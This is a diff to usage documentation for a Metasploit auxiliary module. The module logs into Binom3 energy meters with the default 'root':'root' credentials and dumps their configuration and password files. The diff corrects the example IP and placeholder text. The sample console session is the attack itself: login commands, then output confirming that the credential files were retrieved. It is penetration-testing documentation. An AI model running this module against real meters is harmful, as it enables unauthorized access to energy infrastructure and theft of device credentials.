@@ -11,19 +11,19 @@ This module scans for Binom3 Multifunctional Revenue Energy Meter and Power Qual
 
   ```
 msf > use auxiliary/scanner/http/binom3_login_config_pass_dump
-msf auxiliary(binom3_login_config_pass_dump) > set rhosts 1.2.3.4
+msf auxiliary(binom3_login_config_pass_dump) > set rhosts 1.3.3.7
 msf auxiliary(binom3_login_config_pass_dump) > run
 
-[+] 1.3.3.7:80 - Running Binom3...
+[+] 1.3.3.7:80 - Binom3 confirmed...
 [*] 1.3.3.7:80 - Trying username:"root" with password:"root"
 [+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "root":"root"
 [+] ++++++++++++++++++++++++++++++++++++++
-[+] #{rhost} - dumping configuration
+[+] 1.3.3.7 - dumping configuration
 [+] ++++++++++++++++++++++++++++++++++++++
 [+] 1.3.3.7:80 - File retrieved successfully!
 [*] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000003_moduletest_1.3.3.7_Binom3_config_165927.txt
 [+] ++++++++++++++++++++++++++++++++++++++
-[+] #{rhost} - dumping password file
+[+] 1.3.3.7 - dumping password file
 [+] ++++++++++++++++++++++++++++++++++++++
 [+] 1.3.3.7:80 - File retrieved successfully!
 [*] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000004_moduletest_1.3.3.7_Binom3_passw_010954.txt
